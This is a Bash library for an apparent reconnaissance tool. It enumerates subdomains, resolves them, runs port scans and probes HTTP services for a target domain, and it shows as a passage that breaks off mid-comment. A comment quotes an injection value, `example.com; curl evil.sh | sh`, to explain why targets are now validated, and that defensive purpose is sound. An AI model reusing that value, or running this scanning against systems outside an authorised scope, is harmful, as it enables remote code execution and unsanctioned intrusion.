#!/usr/bin/env bash
# lib/pipeline.sh — the recon pipeline.
#
# Two structural changes over the original:
#
# 1. Resume actually resumes. Previously `known.txt` and `seeds.txt` were built
#    only inside phases 3 and 4. Resuming a scan whose phase-4 checkpoint
#    already existed therefore skipped the code that created them, and the
#    final merge produced an empty master_dns.txt — the run "succeeded" with
#    zero results. Now every phase writes a durable artifact under the output
#    directory, and derived sets are recomputed from those artifacts on entry.
#    Any phase can be resumed, re-run or skipped independently.
#
# 2. No user data reaches a shell parser. The target is validated against a
#    strict hostname pattern and then passed as argv, or through the
#    environment for genuine pipelines. `eval` is gone.

PIPE_PHASE_TOTAL=9

# ---------------------------------------------------------------------------
# Target validation
#
# The original accepted anything after stripping "http://" and "/", then
# interpolated it into eval'd command strings. A target of
# `example.com; curl evil.sh | sh` was executable input.
# ---------------------------------------------------------------------------
pipe_normalise_target() {
    local raw="$1" t
    t="${raw#*://}"          # strip scheme
    t="${t%%/*}"             # strip path
    t="${t%%\?*}"            # strip query
    t="${t%%:*}"             # strip port
    t="${t#www.}"
    t="$(printf '%s' "$t" | compat_bytes tr '[:upper:]' '[:lower:]')"
    t="${t%.}"               # strip trailing dot

    if ! printf '%s' "$t" | compat_bytes grep -Eq '^[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?(\.[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?)+$'; then
        return 1
    fi
    printf '%s\n' "$t"
}

# ---------------------------------------------------------------------------
# Performance profile
#
# Chosen from real memory and core counts, with a floor that keeps a 1 GB VPS
# usable instead of thrashing. The original branched on `free -g` output, which
# reported 0 on any host under 1 GiB and crashed the comparison outright.
# ---------------------------------------------------------------------------
pipe_select_profile() {
    local forced="${1:-auto}"

    case "$forced" in
        lite|balanced|beast) PROFILE="$forced" ;;
        *)
            if   [ "$LS_RAM_MB" -ge 32768 ] && [ "$LS_CORES" -ge 8 ]; then PROFILE="beast"
            elif [ "$LS_RAM_MB" -ge 7168 ]  && [ "$LS_CORES" -ge 4 ]; then PROFILE="balanced"
            else PROFILE="lite"
            fi
            ;;
    esac

    case "$PROFILE" in
        beast)
            HTTPX_THREADS=300; DNS_RATE=15000; NAABU_RATE=3000
            FANOUT=$(( LS_CORES * 2 )); REC_WORDS=50000; PERM_SEEDS=50000
            KATANA_CONC=20
            ;;
        balanced)
            HTTPX_THREADS=120; DNS_RATE=5000;  NAABU_RATE=1500
            FANOUT="$LS_CORES";  REC_WORDS=20000; PERM_SEEDS=20000
            KATANA_CONC=10
            ;;
        lite)
            HTTPX_THREADS=40;  DNS_RATE=1000;  NAABU_RATE=500
            FANOUT=2;            REC_WORDS=5000;  PERM_SEEDS=5000
            KATANA_CONC=5
            ;;
    esac

    # Per-worker rate so total DNS traffic stays at DNS_RATE regardless of fanout.
    [ "$FANOUT" -lt 1 ] && FANOUT=1
    DNS_RATE_PER_WORKER=$(( DNS_RATE / FANOUT ))
    [ "$DNS_RATE_PER_WORKER" -lt 50 ] && DNS_RATE_PER_WORKER=50

    export PROFILE HTTPX_THREADS DNS_RATE NAABU_RATE FANOUT \
           REC_WORDS PERM_SEEDS KATANA_CONC DNS_RATE_PER_WORKER
}

# ---------------------------------------------------------------------------
# Layout
#
# OUT_DIR holds everything durable, including per-phase artifacts, so a resume
# never depends on scratch space surviving. WORK_DIR is disposable.
# ---------------------------------------------------------------------------
pipe_setup_dirs() {
    local target="$1" outroot="$2" monitor="$3"

    BASE_DIR="${outroot}/recon_${target}"
    mkdir -p "$BASE_DIR"

    local stamp
    stamp=$(date +%Y%m%d_%H%M%S)

    # Run directories, newest first. `find | sort -r` rather than a glob so an
    # empty BASE_DIR yields nothing instead of the literal pattern.
    local runs=()
    while IFS= read -r d; do
        [ -n "$d" ] && runs+=("$d")
    done <<EOF
$(find "$BASE_DIR" -maxdepth 1 -mindepth 1 -type d -name '20*' 2>/dev/null | compat_sort -r)
EOF

    RESUMED="false"
    OUT_DIR="${BASE_DIR}/${stamp}"
    if [ "$monitor" != "true" ] && [ "${PIPE_ARG_FRESH:-false}" != "true" ] \
        && [ "${#runs[@]}" -gt 0 ]; then
        # Resume the newest incomplete run rather than starting from scratch.
        if [ ! -f "${runs[0]}/.state/complete" ]; then
            OUT_DIR="${runs[0]}"
            RESUMED="true"
        fi
    fi

    # Distinct invocations can start within the same second. Never overwrite a
    # completed baseline just because its timestamp matches this run's clock.
    if [ "$RESUMED" != "true" ]; then
        local serial=0
        while [ -e "$OUT_DIR" ]; do
            serial=$(( serial + 1 ))
            OUT_DIR="${BASE_DIR}/${stamp}_$(printf '%03d' "$serial")"
        done
    fi

    # Previous master list for differential mode: the newest *completed* run
    # that is not the directory we are about to write into. Deriving it here,
    # before anything is created, is the only point at which it is unambiguous.
    PREV_MASTER=""
    local previous_run=""
    local d
    for d in ${runs[@]+"${runs[@]}"}; do
        [ "$d" = "$OUT_DIR" ] && continue
        if [ -f "${d}/.state/complete" ]; then
            previous_run="$d"
            PREV_MASTER="${d}/master_dns.txt"
            break
        fi
    done

    STATE_DIR="${OUT_DIR}/.state"
    RPT_DIR="${OUT_DIR}/reports"
    LOG_DIR="${OUT_DIR}/logs"
    WORK_DIR=$(compat_scratch_dir "${target}_$$")

    mkdir -p "$OUT_DIR" "$STATE_DIR" "$RPT_DIR" "$LOG_DIR" "$WORK_DIR" || return 1
    if [ "$RESUMED" != "true" ] && [ "$monitor" != "true" ] \
        && [ "${PIPE_ARG_FRESH:-false}" != "true" ] \
        && [ -n "${PIPE_ARG_ONLY:-}" ] && [ -n "$previous_run" ]; then
        pipe_seed_previous "$previous_run" || return 1
    fi
    export BASE_DIR OUT_DIR STATE_DIR RPT_DIR LOG_DIR WORK_DIR PREV_MASTER RESUMED
}

# Selective re-runs need the inputs of the phases they skip. Copy the durable
# artifacts and phase markers into a new directory; the completed baseline and
# its logs remain untouched. The run-level completion marker is never copied.
pipe_seed_previous() {
    local previous="$1" f
    for f in 01_passive.txt 02_brute.txt 03_recursive.txt 04_perms.txt \
             05_http.jsonl 05_live_urls.txt 06_ports.txt 06_extra_urls.txt \
             07_urls.txt 07_crawled_hosts.txt master_dns.txt master_live_urls.txt; do
        [ -f "${previous}/${f}" ] || continue
        cp "${previous}/${f}" "${OUT_DIR}/${f}" || return 1
    done
    for f in "${previous}/.state"/p*.done; do
        [ -f "$f" ] || continue
        cp "$f" "$STATE_DIR/" || return 1
    done
    if [ -d "${previous}/reports" ]; then
        cp -R "${previous}/reports/." "$RPT_DIR/" || return 1
    fi
    return 0
}

pipe_cleanup_workdir() {
    [ -n "${WORK_DIR:-}" ] && [ -d "$WORK_DIR" ] && rm -rf "$WORK_DIR"
    return 0
}

# ---------------------------------------------------------------------------
# Environment handed to shell snippets
#
# `ui_run_sh` runs a literal snippet from this repository. Every piece of
# variable data it needs arrives through the environment, so the snippet text is
# fixed at authoring time and no runtime value is ever parsed as syntax. This is
# the mechanism that replaced `eval`.
# ---------------------------------------------------------------------------
pipe_export_env() {
    export PIPE_TARGET="$1"
    export PIPE_WORK="$WORK_DIR"
    export PIPE_OUT="$OUT_DIR"
    export PIPE_RPT="$RPT_DIR"
    export PIPE_WL_PERM="${WL_PERM:-}"
    export PIPE_WL_BRUTE="${WL_BRUTE:-}"
    export PIPE_RESOLVERS="${WL_RESOLVERS:-}"
}

# ---------------------------------------------------------------------------
# Checkpoints
# ---------------------------------------------------------------------------
pipe_done()      { [ -f "${STATE_DIR}/$1.done" ]; }
pipe_mark_done() {
    [ "${PIPE_PHASE_FAILED:-false}" != "true" ] || return 1
    date +%s > "${STATE_DIR}/$1.done"
}
pipe_reset()     { rm -f "${STATE_DIR}"/*.done "${STATE_DIR}/complete" 2>/dev/null; return 0; }

pipe_all_done() {
    local id
    for id in p1 p2 p3 p4 p5 p6 p7 p8 p9; do
        pipe_done "$id" || return 1
    done
    [ "${PIPE_RUN_FAILED:-false}" != "true" ]
}

# ---------------------------------------------------------------------------
# In-scope filtering
#
# The original mixed `grep -F ".$TARGET"` with a bare `grep "$TARGET"`. The
# latter is unanchored and substring-matching, so scanning example.com happily
# pulled in notexample.com.attacker.net from crt.sh and wayback data — results
# outside the engagement scope. This anchors on a label boundary and the end of
# the line.
# ---------------------------------------------------------------------------
pipe_scope_regex() {
    local t="$1"
    printf '(^|\\.)%s$\n' "${t//./\\.}"
}

pipe_filter_scope() {
    local target="$1"
    # compat_bytes: BSD grep -E rejects invalid UTF-8 under a UTF-8 LC_CTYPE, and
    # `|| true` would then hide the truncation as a normal "no matches" result.
    compat_bytes grep -Ei "$(pipe_scope_regex "$target")" || true
}

# Merge every durable artifact that exists into a deduplicated in-scope set.
# This is the function that makes resume correct: derived state is rebuilt from
# files on disk, never from variables that a skipped phase would have set.
#
# Names are lowercased on the way in. DNS is case-insensitive, so `WWW.host` and
# `www.host` are one name, but the tools disagree about which case to emit and an
# unnormalised merge kept both — inflating counts and probing everything twice.
pipe_rebuild_master() {
    local target="$1" out="${OUT_DIR}/master_dns.txt"
    local parts=() f
    for f in 01_passive.txt 02_brute.txt 03_recursive.txt 04_perms.txt 07_crawled_hosts.txt; do
        [ -s "${OUT_DIR}/${f}" ] && parts+=("${OUT_DIR}/${f}")
    done

    if [ "${#parts[@]}" -eq 0 ]; then
        : > "$out"
    else
        # Every stage here is wrapped in compat_bytes. This list is built from
        # crt.sh, the Wayback CDX index and katana output, so a byte that is not
        # valid UTF-8 arrives sooner or later; under the UI's UTF-8 LC_CTYPE the
        # BSD tools abort at that byte and every hostname after it is lost, which
        # made the same engagement yield different results on macOS and Linux.
        cat "${parts[@]}" \
            | compat_bytes tr -d '\r' \
            | compat_bytes tr '[:upper:]' '[:lower:]' \
            | compat_bytes sed -e 's/^\*\.//' -e 's/^\.//' -e 's/\.$//' -e 's/[[:space:]]*$//' \
            | pipe_filter_scope "$target" \
            | compat_sort -u > "$out"
    fi
    printf '%s\n' "$(compat_count "$out")"
}

# Everything discovered before the permutation stage; used as permutation seeds.
pipe_rebuild_seeds() {
    local target="$1" out="${WORK_DIR}/seeds.txt"
    local parts=() f
    for f in 01_passive.txt 02_brute.txt 03_recursive.txt; do
        [ -s "${OUT_DIR}/${f}" ] && parts+=("${OUT_DIR}/${f}")
    done
    if [ "${#parts[@]}" -eq 0 ]; then
        : > "$out"
    else
        cat "${parts[@]}" | compat_bytes tr -d '\r' | compat_bytes tr '[:upper:]' '[:lower:]' \
            | pipe_filter_scope "$target" | compat_sort -u > "$out"
    fi
    printf '%s\n' "$out"
}

# ---------------------------------------------------------------------------
# Wordlists and resolvers
#
# Cached under the XDG cache directory instead of dumped in $HOME, refreshed
# only when stale, and verified non-empty. Previously a failed download left an
# empty resolvers file and every DNS phase silently returned nothing.
# ---------------------------------------------------------------------------
PIPE_WL_DIR=""

pipe_prepare_wordlists() {
    PIPE_WL_DIR="${LS_CACHE_DIR}/wordlists"
    mkdir -p "$PIPE_WL_DIR"

    WL_BRUTE="${LEETENUM_WORDLIST:-${PIPE_WL_DIR}/dns-brute.txt}"
    WL_RESOLVERS="${PIPE_WL_DIR}/resolvers.txt"

    WL_PERM="${PIPE_WL_DIR}/permutations.txt"
    if [ -n "${LEETENUM_PERM_WORDLIST:-}" ]; then
        if [ -s "$LEETENUM_PERM_WORDLIST" ]; then
            WL_PERM="$LEETENUM_PERM_WORDLIST"
        else
            ui_warn "LEETENUM_PERM_WORDLIST is missing or empty; using the built-in list."
        fi
    fi

    _pipe_refresh_asset "$WL_BRUTE" 30 \
        "https://wordlists-cdn.assetnote.io/data/manual/best-dns-wordlist.txt" \
        "DNS wordlist"
    # Resolvers rot fast; a dead resolver list poisons every result.
    _pipe_refresh_asset "$WL_RESOLVERS" 1 \
        "https://raw.githubusercontent.com/trickest/resolvers/main/resolvers-trusted.txt" \
        "trusted resolvers"

    # The permutation list is built in rather than downloaded. It used to be pulled
    # from a third party's default branch, which now 404s — and unlike a resolver
    # list there was no fallback, so phase 4 was quietly reduced to nothing on
    # every host that had never cached a copy. It is also the only asset small
    # enough to carry in the source, and a fixed list means two runs a month apart
    # remain comparable, which is the same argument that pins the tool versions.
    [ -s "$WL_PERM" ] || _pipe_write_default_perms "$WL_PERM"

    if [ ! -s "$WL_RESOLVERS" ]; then
        ui_warn "No resolver list available; falling back to public resolvers."
        printf '1.1.1.1\n8.8.8.8\n9.9.9.9\n8.8.4.4\n1.0.0.1\n' > "$WL_RESOLVERS"
    fi
    export WL_BRUTE WL_PERM WL_RESOLVERS
}

# Environment, tier, deployment-stage and infrastructure words that gotator
# combines with the hostnames already discovered. Kept deliberately small: gotator
# output grows multiplicatively with this list, and a 10k-word permutation list
# against a few thousand seeds is how a permutation phase turns into a wordlist no
# resolver can chew through inside its budget.
_pipe_write_default_perms() {
    local dest="$1" tmp="${1}.part"
    cat > "$tmp" <<'PERMS'
dev
development
test
testing
tst
qa
uat
stage
staging
stg
prod
production
prd
preprod
pre
sandbox
sbx
demo
poc
lab
local
int
internal
external
ext
corp
intranet
extranet
private
public
admin
administrator
manage
management
mgmt
console
panel
portal
dashboard
api
apis
api1
api2
apiv1
apiv2
v1
v2
v3
rest
graphql
grpc
gw
gateway
proxy
edge
origin
lb
cdn
static
assets
img
images
media
files
upload
uploads
download
downloads
docs
doc
wiki
support
help
status
health
metrics
monitor
monitoring
grafana
kibana
elastic
log
logs
syslog
db
database
sql
mysql
postgres
pg
mongo
redis
cache
queue
mq
kafka
broker
worker
job
jobs
cron
batch
etl
data
warehouse
analytics
report
reports
bi
auth
sso
oauth
oidc
idp
login
account
accounts
user
users
customer
customers
client
clients
partner
vendor
shop
store
cart
checkout
pay
payments
billing
invoice
crm
erp
hr
mail
smtp
imap
webmail
mx
ns
ns1
ns2
vpn
remote
rdp
ssh
sftp
ftp
git
gitlab
jenkins
ci
cd
build
builds
deploy
release
registry
artifacts
nexus
k8s
kube
docker
cloud
aws
s3
bucket
storage
backup
backups
bak
archive
old
legacy
deprecated
new
temp
tmp
www
www1
www2
web
web1
web2
app
app1
app2
apps
srv
server
host
node
node1
node2
primary
secondary
standby
failover
dr
mirror
main
1
2
3
01
02
PERMS
    mv -f "$tmp" "$dest"
    ui_info "Using the built-in permutation wordlist ($(compat_count "$dest") words)."
}

# Download only if missing or older than N days, and never clobber a good copy
# with a failed download.
_pipe_refresh_asset() {
    local path="$1" max_age_days="$2" url="$3" label="$4"
    if [ -s "$path" ]; then
        local stale
        stale=$(find "$path" -mtime "+${max_age_days}" 2>/dev/null | wc -l | compat_bytes tr -d '[:space:]')
        [ "$stale" = "0" ] && return 0
    fi
    ui_step_cfg "${LOG_DIR:-/tmp}/wordlists.log" "" "" true
    if ui_run "Fetching ${label}" -- compat_fetch "$url" "$path"; then
        return 0
    fi
    [ -s "$path" ] && ui_info "Keeping cached ${label}" || ui_warn "Could not fetch ${label}"
    return 0
}

# Skip a phase when its tool is absent, saying so plainly instead of failing
# silently the way `command -v x && ...` did.
pipe_need() {
    local bin="$1" what="$2"
    if command -v "$bin" >/dev/null 2>&1; then return 0; fi
    ui_warn "${bin} not installed, skipping ${what}"
    return 1
}

# ---------------------------------------------------------------------------
# Phase 1 — passive sources
# ---------------------------------------------------------------------------
pipe_phase_passive() {
    local target="$1" art="${OUT_DIR}/01_passive.txt"

    if pipe_done p1; then ui_phase_cached 1 "$PIPE_PHASE_TOTAL" "Passive intel"; return 0; fi
    ui_phase 1 "$PIPE_PHASE_TOTAL" "Passive intel" "certificate logs, archives and passive DNS"

    local raw="${WORK_DIR}/passive_raw.txt"
    : > "$raw"

    if pipe_need subfinder "subfinder"; then
        ui_step_cfg "${LOG_DIR}/subfinder.log" "${WORK_DIR}/subfinder.txt"
        ui_run "subfinder" -- subfinder -d "$target" -all -silent -o "${WORK_DIR}/subfinder.txt" \
            || PIPE_PHASE_FAILED=true
    fi

    if pipe_need assetfinder "assetfinder"; then
        ui_step_cfg "${LOG_DIR}/assetfinder.log" "${WORK_DIR}/assetfinder.txt"
        ui_run_sh "assetfinder" 'assetfinder --subs-only "$PIPE_TARGET" > "$PIPE_WORK/assetfinder.txt"'
    fi

    if pipe_need amass "amass"; then
        # Bounded: amass passive on a large target can run for hours and the
        # marginal yield after 10 minutes is small.
        ui_step_cfg "${LOG_DIR}/amass.log" "${WORK_DIR}/amass.txt"
        ui_run_sh "amass (10m budget)" \
            'compat_timeout 600 amass enum -passive -d "$PIPE_TARGET" -o "$PIPE_WORK/amass.txt"'
    fi

    if command -v jq >/dev/null 2>&1; then
        # crt.sh is the highest-yield passive source and also the least reliable:
        # it rate limits, and it drops connections mid-transfer under load (curl
        # exit 56, typically within seconds of starting).
        #
        # The response is downloaded to a file and then parsed, rather than piped
        # straight into jq, because that is what makes --retry useful. Retrying a
        # transfer that is already writing to a pipe cannot un-send the bytes jq has
        # seen, so jq would get a truncated document followed by a complete one and
        # fail to parse either. With -o, curl truncates the file on each attempt and
        # jq only ever sees one whole document.
        #
        # --retry-max-time keeps the retries honest: --max-time is per attempt, so
        # `--retry 2` alone would let a merely slow crt.sh turn a 2 minute cap into a
        # 6 minute one. No further attempt starts after 150s.
        ui_step_cfg "${LOG_DIR}/crtsh.log" "${WORK_DIR}/crtsh.txt"
        ui_run_sh "crt.sh certificate transparency" '
            curl -fsS --retry 2 --retry-delay 3 --retry-max-time 150 --max-time 120 \
                 -A "LeetEnum" -o "$PIPE_WORK/crtsh.json" \
                 "https://crt.sh/?q=%25.${PIPE_TARGET}&output=json" || exit $?
            jq -r ".[].name_value" < "$PIPE_WORK/crtsh.json" \
              | compat_bytes tr "[:upper:]" "[:lower:]" \
              | compat_bytes sed "s/^\*\.//" \
              | compat_bytes sort -u \
              > "$PIPE_WORK/crtsh.txt"'
    fi

    ui_step_cfg "${LOG_DIR}/wayback.log" "${WORK_DIR}/wayback.txt"
    ui_run_sh "Wayback Machine index" '
        curl -fsS --max-time 180 "https://web.archive.org/cdx/search/cdx?url=*.${PIPE_TARGET}/*&output=text&fl=original&collapse=urlkey" \
          | compat_bytes awk -F/ "{print \$3}" \
          | compat_bytes awk -F: "{print \$1}" \
          | compat_bytes sort -u \
          > "$PIPE_WORK/wayback.txt"'

    _pipe_finish_passive "$target" "$raw" "$art"
}

_pipe_finish_passive() {
    local target="$1" raw="$2" art="$3"

    # Named explicitly rather than globbing *.txt: the original `cat
    # "$WORK_DIR"/*.txt` also swallowed resolvers.txt and, on a resumed run,
    # its own previous output.
    local src=() f
    for f in subfinder assetfinder amass crtsh wayback; do
        [ -s "${WORK_DIR}/${f}.txt" ] && src+=("${WORK_DIR}/${f}.txt")
    done

    if [ "${#src[@]}" -eq 0 ]; then
        ui_warn "No passive sources returned data"
        : > "$art"; pipe_mark_done p1; return 0
    fi

    cat "${src[@]}" | compat_bytes tr -d '\r' | compat_bytes tr '[:upper:]' '[:lower:]' \
        | compat_bytes sed -e 's/^\*\.//' -e 's/[[:space:]]//g' \
        | pipe_filter_scope "$target" | compat_sort -u > "$raw"
    ui_detail "candidates" "$(compat_count "$raw")"

    if [ -s "$raw" ] && pipe_need puredns "passive resolution"; then
        ui_step_cfg "${LOG_DIR}/resolve_passive.log" "$art"
        ui_run "Resolving passive candidates" -- \
            puredns resolve "$raw" -r "$WL_RESOLVERS" -w "$art" \
                --rate-limit "$DNS_RATE" --skip-wildcard-filter --skip-validation || return $?
    else
        cp "$raw" "$art"
    fi

    ui_detail "resolved" "$(compat_count "$art")"
    pipe_mark_done p1
}

# ---------------------------------------------------------------------------
# Phase 2 — brute force
# ---------------------------------------------------------------------------
pipe_phase_brute() {
    local target="$1" art="${OUT_DIR}/02_brute.txt"

    if pipe_done p2; then ui_phase_cached 2 "$PIPE_PHASE_TOTAL" "Brute force"; return 0; fi
    ui_phase 2 "$PIPE_PHASE_TOTAL" "Brute force" "wordlist: $(basename "$WL_BRUTE"), $(compat_count "$WL_BRUTE") entries"

    if ! pipe_need puredns "brute force"; then : > "$art"; pipe_mark_done p2; return 0; fi
    if [ ! -s "$WL_BRUTE" ]; then
        ui_warn "Wordlist unavailable; brute force remains pending"
        : > "$art"; return 1
    fi

    ui_step_cfg "${LOG_DIR}/brute.log" "$art"
    ui_run "Brute forcing subdomains" -- \
        puredns bruteforce "$WL_BRUTE" "$target" -r "$WL_RESOLVERS" -w "$art" \
            --rate-limit "$DNS_RATE" || return $?

    ui_detail "resolved" "$(compat_count "$art")"
    pipe_mark_done p2
}

# ---------------------------------------------------------------------------
# Phase 3 — recursive brute force
#
# Fans out across discovered hosts. The worker is a standalone script file
# rather than an exported function inside an xargs bash -c string, so a hostile
# hostname cannot break out of quoting, and it works under dash-based /bin/sh.
# ---------------------------------------------------------------------------
pipe_phase_recursive() {
    local target="$1" art="${OUT_DIR}/03_recursive.txt"

    if pipe_done p3; then ui_phase_cached 3 "$PIPE_PHASE_TOTAL" "Recursive brute force"; return 0; fi

    local seeds targets="${WORK_DIR}/rec_targets.txt"
    seeds=$(pipe_rebuild_seeds "$target")

    # Only recurse into hosts that have room for another label, and cap the set.
    awk -F. 'NF >= 3 && NF <= 5' "$seeds" | head -n 2000 > "$targets"
    local n; n=$(compat_count "$targets")

    ui_phase 3 "$PIPE_PHASE_TOTAL" "Recursive brute force" "${n} parents, ${FANOUT} workers"

    if [ "$n" -eq 0 ] || ! pipe_need puredns "recursion"; then
        : > "$art"; pipe_mark_done p3; return 0
    fi

    head -n "$REC_WORDS" "$WL_BRUTE" > "${WORK_DIR}/rec_words.txt"

    local worker="${WORK_DIR}/rec_worker.sh"
    cat > "$worker" <<'WORKER'
#!/usr/bin/env bash
# Resolve one parent host. The hostname arrives as argv only, so xargs never
# hands it to a shell for re-parsing.
host="${1:-}"
[ -n "$host" ] || exit 0
safe=$(printf '%s' "$host" | compat_bytes tr -c 'a-zA-Z0-9._-' '_')
rc=0
puredns bruteforce "$REC_WORDS_FILE" "$host" \
    -r "$REC_RESOLVERS" -w "${REC_OUT_DIR}/${safe}.txt" \
    --rate-limit "$REC_RATE" || rc=$?
# Progress ticker: one line per completed parent.
printf 'done\n' >> "$REC_PROGRESS"
exit "$rc"
WORKER
    chmod +x "$worker"

    mkdir -p "${WORK_DIR}/rec"
    : > "${WORK_DIR}/rec_progress.txt"
    export REC_WORDS_FILE="${WORK_DIR}/rec_words.txt" \
           REC_RESOLVERS="$WL_RESOLVERS" \
           REC_OUT_DIR="${WORK_DIR}/rec" \
           REC_RATE="$DNS_RATE_PER_WORKER" \
           REC_PROGRESS="${WORK_DIR}/rec_progress.txt" \
           REC_WORKER="$worker" \
           REC_TARGETS="$targets" \
           REC_FANOUT="$FANOUT"

    # Progress is measured in completed parents, which is a genuine total, so
    # this phase shows a real percentage rather than an indefinite spinner.
    ui_step_cfg "${LOG_DIR}/recursive.log" "${WORK_DIR}/rec_progress.txt" "$n"
    ui_run_sh "Recursing into ${n} parents" \
        'xargs -P "$REC_FANOUT" -n 1 "$REC_WORKER" < "$REC_TARGETS"' \
        || PIPE_PHASE_FAILED=true

    cat "${WORK_DIR}"/rec/*.txt 2>/dev/null | pipe_filter_scope "$target" \
        | compat_sort -u > "$art"
    ui_detail "new hosts" "$(compat_count "$art")"
    pipe_mark_done p3
}

# ---------------------------------------------------------------------------
# Phase 4 — permutations
# ---------------------------------------------------------------------------
pipe_phase_permute() {
    local target="$1" art="${OUT_DIR}/04_perms.txt"

    if pipe_done p4; then ui_phase_cached 4 "$PIPE_PHASE_TOTAL" "Permutations"; return 0; fi

    local seeds; seeds=$(pipe_rebuild_seeds "$target")
    local seed_n; seed_n=$(compat_count "$seeds")
    ui_phase 4 "$PIPE_PHASE_TOTAL" "Permutations" "${seed_n} seeds, capped at ${PERM_SEEDS}"

    if [ "$seed_n" -eq 0 ] || ! pipe_need gotator "permutations"; then
        : > "$art"; pipe_mark_done p4; return 0
    fi

    head -n "$PERM_SEEDS" "$seeds" > "${WORK_DIR}/perm_seeds.txt"

    ui_step_cfg "${LOG_DIR}/gotator.log" "${WORK_DIR}/perms_raw.txt" "" true
    ui_run_sh "Generating permutations" '
        compat_timeout 1800 gotator -sub "$PIPE_WORK/perm_seeds.txt" -perm "$PIPE_WL_PERM" \
            -depth 1 -numbers 3 -silent > "$PIPE_WORK/perms_raw.txt"' || return $?

    if [ -s "${WORK_DIR}/perms_raw.txt" ] && pipe_need puredns "permutation resolution"; then
        ui_step_cfg "${LOG_DIR}/resolve_perms.log" "$art"
        ui_run "Resolving permutations" -- \
            puredns resolve "${WORK_DIR}/perms_raw.txt" -r "$WL_RESOLVERS" -w "$art" \
                --rate-limit "$DNS_RATE" || return $?
    else
        : > "$art"
    fi

    ui_detail "resolved" "$(compat_count "$art")"
    pipe_mark_done p4
}

# ---------------------------------------------------------------------------
# Phase 5 — HTTP probing
#
# httpx writes JSONL so the report stage can pull status, title, technology and
# content length without re-probing. The original ran httpx twice, once for
# plain URLs and again for metadata, doubling the traffic against the target.
# ---------------------------------------------------------------------------
pipe_phase_http() {
    local target="$1"
    local master="${OUT_DIR}/master_dns.txt"
    local jsonl="${OUT_DIR}/05_http.jsonl"
    local urls="${OUT_DIR}/05_live_urls.txt"

    if pipe_done p5; then ui_phase_cached 5 "$PIPE_PHASE_TOTAL" "HTTP probing"; return 0; fi

    local total; total=$(pipe_rebuild_master "$target")
    ui_phase 5 "$PIPE_PHASE_TOTAL" "HTTP probing" "${total} names, ${HTTPX_THREADS} threads"

    if [ "$total" -eq 0 ] || ! pipe_need httpx "HTTP probing"; then
        : > "$jsonl"; : > "$urls"; pipe_mark_done p5; return 0
    fi

    # Watching the JSONL line count gives a genuine progress signal against a
    # known total, so this shows a percentage rather than a spinner.
    ui_step_cfg "${LOG_DIR}/httpx.log" "$jsonl" "$total"
    ui_run "Probing HTTP services" -- \
        httpx -l "$master" -json -o "$jsonl" \
              -threads "$HTTPX_THREADS" -timeout 8 -retries 1 \
              -follow-redirects -tech-detect -title -status-code -silent \
              -no-color || return $?

    pipe_extract_urls "$jsonl" "$urls" || return $?
    ui_detail "live services" "$(compat_count "$urls")"
    pipe_mark_done p5
}

# Pull the URL field out of httpx JSONL. jq when available, otherwise a narrow
# sed that matches only the exact key, because a title or tech string can also
# contain the substring `"url":`.
pipe_extract_urls() {
    local jsonl="$1" out="$2"
    if [ ! -s "$jsonl" ]; then : > "$out"; return 0; fi
    if command -v jq >/dev/null 2>&1; then
        jq -r 'select(.url != null) | .url' < "$jsonl" 2>/dev/null | compat_sort -u > "$out"
    else
        sed -n 's/.*"url"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p' "$jsonl" \
            | compat_sort -u > "$out"
    fi
}

# ---------------------------------------------------------------------------
# Phase 6 — port scanning
#
# Two corrections over the original:
#   * Scan type is chosen from privilege. naabu defaults to a SYN scan, which
#     needs raw sockets; as an unprivileged user it aborted with a permission
#     error and the original discarded that into /dev/null, so the phase
#     "succeeded" with no ports. A connect scan needs no privileges.
#   * Services found on non-standard ports are probed with httpx and folded into
#     the live URL set. Previously an admin panel on :8443 was found by naabu and
#     then never looked at again.
# ---------------------------------------------------------------------------
pipe_phase_ports() {
    local target="$1"
    local master="${OUT_DIR}/master_dns.txt"
    local art="${OUT_DIR}/06_ports.txt"
    local extra="${OUT_DIR}/06_extra_urls.txt"

    if pipe_done p6; then ui_phase_cached 6 "$PIPE_PHASE_TOTAL" "Port scanning"; return 0; fi

    local total; total=$(pipe_rebuild_master "$target")
    local mode="connect" scan_type="c"
    if [ "$(id -u)" -eq 0 ]; then mode="syn"; scan_type="s"; fi
    ui_phase 6 "$PIPE_PHASE_TOTAL" "Port scanning" \
             "${total} hosts, ${mode} scan at ${NAABU_RATE}/s"

    if [ "$total" -eq 0 ] || ! pipe_need naabu "port scanning"; then
        : > "$art"; : > "$extra"; pipe_mark_done p6; return 0
    fi
    if [ "$mode" = "connect" ]; then
        ui_info "Not running as root; using a connect scan (slower, no raw sockets needed)."
    fi

    ui_step_cfg "${LOG_DIR}/naabu.log" "$art" "" true
    ui_run "Scanning ports" -- \
        naabu -list "$master" -top-ports 1000 -o "$art" \
              -rate "$NAABU_RATE" -c 50 -scan-type "$scan_type" \
              -silent -no-color -stats=false || return $?

    ui_detail "open ports" "$(compat_count "$art")"
    pipe_probe_extra_ports "$art" "$extra" || return $?
    pipe_mark_done p6
}

# Probe anything that is not already covered by the phase-6 scan of :80/:443.
pipe_probe_extra_ports() {
    local ports="$1" out="$2"
    : > "$out"
    [ -s "$ports" ] || return 0
    command -v httpx >/dev/null 2>&1 || return 0

    local cand="${WORK_DIR}/extra_ports.txt"
    grep -vE ':(80|443)$' "$ports" 2>/dev/null | compat_sort -u > "$cand" || true
    [ -s "$cand" ] || return 0

    ui_step_cfg "${LOG_DIR}/httpx_ports.log" "$out" "$(compat_count "$cand")"
    ui_run "Probing non-standard ports" -- \
        httpx -l "$cand" -o "$out" -threads "$HTTPX_THREADS" \
              -timeout 8 -retries 1 -silent -no-color || return $?
    ui_detail "extra services" "$(compat_count "$out")"
    return 0
}

# Every URL worth attacking: standard-port services from phase 6 plus anything
# phase 7 found elsewhere. Rebuilt from disk, so phases 8-10 work correctly on a
# resumed run where 6 and 7 were skipped.
pipe_live_urls() {
    local out="${WORK_DIR}/live_urls.txt"
    local parts=() f
    for f in 05_live_urls.txt 06_extra_urls.txt; do
        [ -s "${OUT_DIR}/${f}" ] && parts+=("${OUT_DIR}/${f}")
    done
    if [ "${#parts[@]}" -eq 0 ]; then
        : > "$out"
    else
        cat "${parts[@]}" | compat_bytes tr -d '\r' | compat_bytes sed 's/[[:space:]]*$//' \
            | compat_bytes grep -E '^https?://' | compat_sort -u > "$out" || true
    fi
    printf '%s\n' "$out"
}

# ---------------------------------------------------------------------------
# Phase 7 — crawling
#
# Crawling is the only phase that can discover hostnames DNS enumeration never
